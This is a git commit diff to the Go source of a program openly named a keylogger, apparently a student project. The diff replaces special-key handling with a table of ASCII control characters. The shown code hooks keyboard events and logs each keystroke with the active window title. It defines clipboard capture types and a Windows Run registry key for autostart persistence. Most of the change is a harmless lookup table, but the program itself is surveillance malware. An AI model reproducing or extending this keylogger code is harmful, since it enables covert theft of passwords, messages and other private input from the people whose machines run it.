9f449be57262f15ce0cee3698a47b187706c1522
AreSZerA <18722064@bjtu.edu.cn>
2022-04-07 03:03:04 +0800

    Control characters

--- keylogger-application/keylogger.go
+++ keylogger-application/keylogger.go
@@ -35,12 +35,48 @@ const (
 	KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
 	AppName = "Keylogger"
 
-	TypeKeyboard  KeyType = "KBD"
-	TypeClipboard KeyType = "CBD"
-	TypeSpecial   KeyType = "SPC"
+	TypeKeyboard  KeyType = "KYBD"
+	TypeClipboard KeyType = "CPBD"
+	TypeControl   KeyType = "CTRL"
 
 	Interval = 10 * time.Second
 )
+
+var ControlCharacters = map[rune]string{
+	rune(0):   "NULL", // Null character
+	rune(1):   "SOH",  // Start of header
+	rune(2):   "STX",  // Start of text
+	rune(3):   "ETX",  // End of text
+	rune(4):   "EOT",  // End of transmission
+	rune(5):   "ENQ",  // Enquiry
+	rune(6):   "ACK",  // Acknowledgement
+	rune(7):   "BEL",  // Bell
+	rune(8):   "BS",   // Backspace
+	rune(9):   "HT",   // Horizontal tab
+	rune(10):  "LF",   // Line feed
+	rune(11):  "VT",   // Vertical tab
+	rune(12):  "FF",   // Form feed
+	rune(13):  "CR",   // Carriage return
+	rune(14):  "SO",   // Shift out
+	rune(15):  "SI",   // Shift in
+	rune(16):  "DLE",  // Data link escape
+	rune(17):  "DC1",  // Device control 1
+	rune(18):  "DC2",  // Device control 2
+	rune(19):  "DC3",  // Device control 3
+	rune(20):  "DC4",  // Device control 4
+	rune(21):  "NAK",  // Negative acknowledgement
+	rune(22):  "SYN",  // Synchronous idle
+	rune(23):  "ETB",  // End of transmission block
+	rune(24):  "CAN",  // Cancel
+	rune(25):  "EM",   // End of medium
+	rune(26):  "SUB",  // Substitute
+	rune(27):  "ESC",  // Escape
+	rune(28):  "FS",   // File separator
+	rune(29):  "GS",   // Group separator
+	rune(30):  "RS",   // Record separator
+	rune(31):  "US",   // Unit separator
+	rune(127): "DEL",  // Delete
+}
 
 type keyLog struct {
 	Time  int64   `json:"time"`
@@ -110,17 +146,10 @@ func listenKeyboard() {
 		if ev.Kind == hook.KeyDown {
 			// Get title.
 			title := getTitle()
-			// Treat return (\r, enter on keyboard), backspace (\b), and tab (\t) as special keys.
-			switch ev.Keychar {
-			case '\r':
-				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, title, "enter"))
-			case '\b':
-				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, title, "backspace"))
-			case '\t':
-				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, title, "tab"))
-			case rune(27):
-				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, title, "escape"))
-			default:
+			// Handle control characters (ASCII from 0 to 31 and 127)
+			if ev.Keychar < 32 || ev.Keychar == 127 {
+				keyLogs = append(keyLogs, newKeyLog(TypeControl, title, ControlCharacters[ev.Keychar]))
+			} else {
 				// When nothing logged or the last recorded character is not TypeKeyboard, append a new logKey object
 				// directly. If it has recorded and the last recorded type is also TypeKeyboard, append the character to
 				// the Value field of the last object.
